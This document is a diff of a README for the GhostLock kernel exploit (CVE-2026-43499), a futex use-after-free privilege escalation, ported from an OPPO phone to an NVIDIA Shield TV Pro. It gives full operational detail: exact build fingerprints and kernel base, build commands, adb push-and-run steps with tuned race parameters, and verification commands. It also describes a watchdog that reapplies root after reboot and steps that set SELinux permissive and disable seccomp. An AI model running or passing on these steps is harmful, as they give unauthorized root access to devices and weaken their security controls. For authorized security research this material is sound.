@@ -1,220 +1,162 @@
-# GhostLock — OPPO PCKM00 (4.14.180) PoC
+# GhostLock for NVIDIA Shield TV Pro 9.2.4
 
-**CVE-2026-43499 (GhostLock)** — Linux kernel `futex` priority-inheritance
-use-after-free local privilege escalation PoC, ported to the **OPPO PCKM00
-(OP4A57, SM6150, Android 11, kernel 4.14.180-perf+)**.
+Validated `arm64` port of the GhostLock futex PI use-after-free
+(CVE-2026-43499) for the 2019 NVIDIA Shield TV Pro (`mdarcy`) running Shield
+Experience 9.2.4. The payload changes the credentials of the live ADB daemon,
+so new ADB shells are UID 0 without a bootloader unlock, userdata wipe, `su`
+installation, or verified-partition modification.
 
-> **DISCLAIMER / 免责声明**
-> This project is for **authorized security research and educational purposes
-> only**. Do not use it on any device you do not own or are not explicitly
-> authorized to test. Running the exploit may crash the kernel. The author
-> assumes no liability for any misuse or damage.
->
-> 本项目仅用于**授权的安全研究与教育目的**。请勿在非本人所有或未获明确授权的设备上使用。运行利用可能导致内核崩溃，作者不承担任何滥用或损失的责任。
+> This is a build-specific kernel exploit for authorized security research.
+> A mismatch or lost race can panic the kernel. Do not run it on another
+> fingerprint, kernel, device, or hardware revision.
 
----
+## Validated target
 
-## 1. Vulnerability
+| Field | Required value |
+| --- | --- |
+| Product | NVIDIA Shield TV Pro 2019, `mdarcy` |
+| Fingerprint | `NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/7825230_4387.0822:user/release-keys` |
+| Kernel | `4.9.141-tegra-gb6e5605a` |
+| Android patch level | `2026-01-05` |
+| Kernel base | `0xffffff8008080000` (offset disabled) |
 
-CVE-2026-43499 (GhostLock) is a use-after-free in the Linux kernel futex
-priority-inheritance code. The bug lives in `remove_waiter()` being misused in
-the proxy-lock rollback path of `rt_mutex_start_proxy_lock()`. The free'd
-`rt_mutex_waiter` (allocated on the kernel stack) is re-interpreted as an
-attacker-controlled `fd_set` copied in by `pselect()`, which yields an
-arbitrary-write primitive.
+The port was validated on a locked device with green Verified Boot and
+enforcing dm-verity. Those mechanisms remain intact because the exploit
+changes only live kernel state.
 
-**Affected range:** Linux 4.x–6.x (introduced 2011). 4.14 series fully
-affected. See `report.md` for the full analysis and verified symbol offsets.
+## Result and lifetime
 
-### Exploit chain
+After a successful run, a fresh connection reports UID/GID 0 for both `adbd`
+and its child shell, full capabilities through capability 37, seccomp disabled,
+and SELinux permissive. Root survives ADB client disconnects. It does not
+survive an `adbd` restart or device reboot.
 
-```
-futex requeue-pi UAF
-   └─> pselect fd_set stack copy (fake rt_mutex_waiter / fake task)
-         └─> arbitrary write (rt_mutex tree ops / sched_setattr)
-               └─> overwrite ashmem_fops -> configfs bin read/write
-                     └─> pipe_buffer page rewrite (physical RW primitive)
-                           └─> patch current task cred -> root
-```
+For practical reboot persistence without modifying verified partitions, the
+repository includes an optional, rootless Podman watchdog for an always-on
+Linux host. It is locked to the exact fingerprint, kernel, and payload hash and
+reapplies the exploit only when a fresh ADB shell is not root. See
+[`watchdog/README.md`](watchdog/README.md).
 
-The PoC runs entirely in userspace via `LD_PRELOAD` — no device reboot
-required (unless the kernel panics).
+## Exploit chain
 
----
+1. Trigger the vulnerable futex PI rollback path and retain a stale
+   `rt_mutex_waiter` on a kernel stack.
+2. Stamp the reclaimed stack with `MCAST_BLOCK_SOURCE` and redirect the
+   rt-mutex tree operation.
+3. Reclaim a freed order-2 `mm_struct` slab page with a shaped skb payload.
+4. Redirect `ashmem_misc.fops` to a fake table backed by legacy configfs
+   read/write handlers.
+5. Walk the task list, locate the requested `adbd` PID, and verify its complete
+   credential object.
+6. Perform one bounded write over IDs, securebits, and capability words; make
+   SELinux permissive; then restore the ashmem operations and boot-ID pointer.
 
-## 2. Target
+The inherited pipe-buffer physical read/write stage is not used. Detailed
+target observations and verified offsets are in [`PORT_STATUS.md`](PORT_STATUS.md).
 
-| Field         | Value                                    |
-|---------------|------------------------------------------|
-| Device        | OPPO PCKM00 / OP4A57                     |
-| SoC           | Qualcomm SM6150                          |
-| Android       | 11 (RKQ1.200903.002)                     |
-| Security patch| 2022-09-05                               |
-| Kernel        | 4.14.180-perf+ (arm64, clang 10.0.7)     |
-| Build         | `OPPO/PCKM00/PCKM00:11/RKQ1.200903.002/1635513065:user/release-keys` |
+## Build
 
-> Porting to other 4.14 devices: copy `exploit/targets/oppo-pckm00/target.h`
-> and regenerate the symbol offsets from your kernel image (see `analysis/`).
+The compiler is Android NDK r29 (`aarch64-linux-android30-clang`). Build
+directly with an installed Linux NDK:
 
----
-
-## 3. Repository layout
-
-```
-.
-├── report.md                    # Full vulnerability analysis & verified offsets
-├── exploit/
-│   ├── Makefile                 # Build preload.so (Windows NDK / WSL)
-│   ├── src/
-│   │   ├── preload.c            # LD_PRELOAD entry + forced disk logging + su
-│   │   ├── main.c               # Orchestration (waiter/owner/consumer threads)
-│   │   ├── slide.c              # KASLR leak (boot_id / nfulnl loggers)
-│   │   ├── fops.c               # ashmem_fops overwrite + configfs primitive
-│   │   ├── pipe.c               # pipe_buffer physrw primitive
-│   │   ├── root.c               # task walk + cred patch + seccomp/selinux
-│   │   ├── util.c               # kernelsnitch, skb page prep, kernel RW
-│   │   ├── su_daemon.c          # embedded su server (drop-in)
-│   │   ├── su_blob.S            # .incbin of su_daemon
-│   │   └── wallpaper_blob.S     # .incbin of wallpaper payload
-│   ├── targets/oppo-pckm00/target.h   # 4.14.180 symbol/struct offsets
-│   └── assets/wallpaper.webp    # embedded wallpaper payload
-├── analysis/                    # kernel image / kallsyms extraction scripts
-└── LICENSE                      # Apache-2.0 (same as upstream GhostLock)
-```
-
----
-
-## 4. Build
-
-Requires Android NDK r29 (`aarch64-linux-android30-clang`).
-
-### Windows NDK
-
-```bat
-set NDK=C:\path\to\android-ndk-r29
-make NDK=%NDK%
-```
-
-### WSL (recommended)
-
-```bash
-# put NDK at /opt/ndk/android-ndk-r29 (linux-x86_64 toolchain)
+```sh
 cd exploit
-make wsl
-# or directly:
-bash ../analysis/build_preload.sh
+make NDK=/opt/android-ndk-r29
 ```
 
-Output: `exploit/preload.so` (64-bit aarch64 ELF shared object).
+Or build the supplied Podman image, which downloads the official r29 Linux
+archive and checks its published SHA-1 before extraction:
 
-The build also compiles `su_daemon.c` to a PIE binary and embeds it (plus the
-wallpaper) into the `.so` via the `.S` blobs.
-
----
-
-## 5. Usage (ADB)
-
-### 5.1 Push the payload
-
-```bash
-# binary only (works from a release asset or a local build)
-adb push preload.so /data/local/tmp/preload.so
-
-# or with the repo layout
-adb push exploit/preload.so /data/local/tmp/preload.so
-adb shell chmod 755 /data/local/tmp/preload.so
+```sh
+podman build -t ghostlock-android:ndk-r29 -f build/Containerfile .
+podman run --rm \
+  -v "$PWD:/src:Z" \
+  -w /src/exploit \
+  ghostlock-android:ndk-r29 make -B
 ```
 
-### 5.2 Run
+Output:
 
-The `.so` is loaded into the `sh` process via `LD_PRELOAD`; its constructor
-runs the whole exploit chain and reports the result:
-
-```bash
-adb shell LD_PRELOAD=/data/local/tmp/preload.so id
+```text
+exploit/build/preload-mdarcy-9.2.4.so
+SHA-256 a3a1e75b627d8dd419e9bafd2a73082a8647510bf6ce4f975e52baf5aa1d0761
 ```
 
-On success the shell reports:
+The Shield build intentionally excludes the reference project's embedded `su`
+daemon and wallpaper payload.
 
-```
-uid=0(root) gid=0(root) ...
-[+] ROOT OK pid=<pid> uid=0
-```
+## Run
 
-The current process (and its children) is now root. A `su` daemon is
-installed to `/apex/com.android.virt/bin/su` (falling back to
-`/data/local/tmp/su`) and an embedded wallpaper is applied as a
-persistence/verification artifact.
+Connect over authorized network ADB, push the release asset or local build,
+then enter an ADB shell:
 
-### 5.3 Verify
-
-```bash
-# from a new shell after the run
-adb shell su -c 'id'
-
-# or grab a root shell session (interactive su client)
-adb shell /data/local/tmp/su
-
-# check SELinux was toggled permissive (if the selinux path was hit)
-adb shell getenforce
+```sh
+adb connect SHIELD_ADDRESS:5555
+adb -s SHIELD_ADDRESS:5555 push \
+  exploit/build/preload-mdarcy-9.2.4.so \
+  /data/local/tmp/preload-mdarcy-9.2.4.so
+adb -s SHIELD_ADDRESS:5555 shell chmod 0755 \
+  /data/local/tmp/preload-mdarcy-9.2.4.so
+adb -s SHIELD_ADDRESS:5555 shell
 ```
 
-### 5.4 Forced real-time disk logging
+Run this inside that device shell:
 
-All `pr_*` diagnostics are also written to
-**`/sdcard/Download/log_<timestamp>.txt`** (falling back to
-`/data/local/tmp/log_<timestamp>.txt`), with `O_SYNC` + `fsync()` on every
-line so logs survive a kernel panic / reboot:
-
-```bash
-adb pull /sdcard/Download/log_*.txt
-# or if /sdcard is not mounted early
-adb pull /data/local/tmp/log_*.txt
-adb shell cat /sdcard/Download/log_*.txt
+```sh
+GHOSTLOCK_FIXED_BASE=1 \
+GHOSTLOCK_MAIN_ROUTE=slide-mcast \
+GHOSTLOCK_SLIDE_FULL_LOCK=1 \
+GHOSTLOCK_MIXED_ORDER_PAYLOAD=1 \
+GHOSTLOCK_MM_PARTIALS=14 \
+GHOSTLOCK_BUDDY_HOLD_PAIRS=256 \
+GHOSTLOCK_BUDDY_HOLD_SENDS=8192 \
+GHOSTLOCK_RECLAIM_PAIRS=64 \
+GHOSTLOCK_RECLAIM_SENDS=2048 \
+GHOSTLOCK_ADBD_ROOT_CONFIGFS=1 \
+GHOSTLOCK_ADBD_PID="$(pidof adbd)" \
+LD_PRELOAD=/data/local/tmp/preload-mdarcy-9.2.4.so \
+/system/bin/true
 ```
 
-The log shows every stage (KASLR slide, fops overwrite, pipe physrw, cred
-patch) and the final `uid_after` / `ROOT OK` line — attach it when reporting
-an issue.
+Disconnect and open a fresh transport for verification:
 
-### 5.5 Cleanup
-
-```bash
-adb shell rm -f /data/local/tmp/preload.so /data/local/tmp/log_*.txt
-adb shell rm -f /data/local/tmp/su /data/local/tmp/temp_su.sock /data/local/tmp/su_daemon.log
-adb reboot   # if SELinux/cred state or the wallpaper was modified
+```sh
+adb disconnect SHIELD_ADDRESS:5555
+adb connect SHIELD_ADDRESS:5555
+adb -s SHIELD_ADDRESS:5555 shell id
+adb -s SHIELD_ADDRESS:5555 shell \
+  'grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp):" /proc/$(pidof adbd)/status'
 ```
 
-> **Note:** running the exploit may crash the kernel. If `adb` drops, wait for
-> the device to reboot, then pull `/sdcard/Download/log_*.txt` — the forced
-> `O_SYNC`/`fsync` logging is exactly what survives the panic.
+The payload refuses to retrigger from an already-UID-0 ADB shell unless
+`GHOSTLOCK_FORCE_ROOT_TRIGGER=1` is deliberately supplied. Do not force it;
+the privileged scheduling path has different PI behavior and can panic.
 
----
+## Logs and recovery
 
-## 6. Notes & Limitations
+Diagnostics are synchronously written to
+`/sdcard/Download/log_<timestamp>.txt`, falling back to `/data/local/tmp`.
+If the race panics the kernel, wait for the normal reboot and pull the latest
+log before retrying. The watchdog defaults to a 15-minute global cooldown and
+two attempts per boot to avoid a reboot loop.
 
-- **KASLR**: the PoC leaks the slide via the `boot_id`/nfulnl logger path
-  (`slide.c`) plus an ashmem_fops verification pass (`fops.c`).
-- **4.14 vs 6.x differences handled** in this port:
-  - configfs uses legacy `.read`/`.write` (no `read_iter`/`write_iter`),
-  - `ashmem_fops` has no `show_fdinfo`,
-  - `generic_file_splice_read` replaces `copy_splice_read`,
-  - `selinux_enforcing` lives inside `struct selinux_state`,
-  - 4.14 `rt_mutex_waiter` / `pipe_inode_info` / `cred` layouts.
-- Some struct offsets (e.g. `task_struct.seccomp`) are best-effort; failure to
-  patch seccomp does **not** block the cred-overwrite root.
-- Running the exploit may trigger a kernel panic (~97% reliability in ~5s on
-  the target); use an isolated device.
+## Repository map
 
----
+- `exploit/src/`: trigger, reclaim, arbitrary read/write, and bounded adbd
+  credential patch.
+- `exploit/targets/shield-mdarcy-9.2.4/`: exact build-specific target layout.
+- `analysis/`: kernel symbol and layout extraction helpers.
+- `watchdog/`: hash-pinned host-side re-root service.
+- `report.md`: original OPPO reference-port analysis retained for provenance.
 
-## 7. Credits
+## Credits and license
 
-- **NebuSec** — original GhostLock research & exploit framework
-  (`IonStack/CVE-2026-43499`), Apache-2.0.
-  https://github.com/NebuSec/CyberMeowfia
-- KernelSnitch (futex hash side-channel) is embedded under its upstream terms.
+This port derives from the GhostLock research and exploit framework published
+by NebuSec and the OPPO PCKM00 reference port by yijiacloud. KernelSnitch is
+embedded under its upstream terms.
 
-## License
+- <https://github.com/NebuSec/CyberMeowfia>
+- <https://github.com/yijiacloud/GhostLock-OPPO-PCKM00>
+- <https://github.com/torvalds/linux/commit/3bfdc63936dd4773109b7b8c280c0f3b5ae7d349>
 
-Apache-2.0 — see [LICENSE](LICENSE).
+Apache-2.0; see [`LICENSE`](LICENSE).
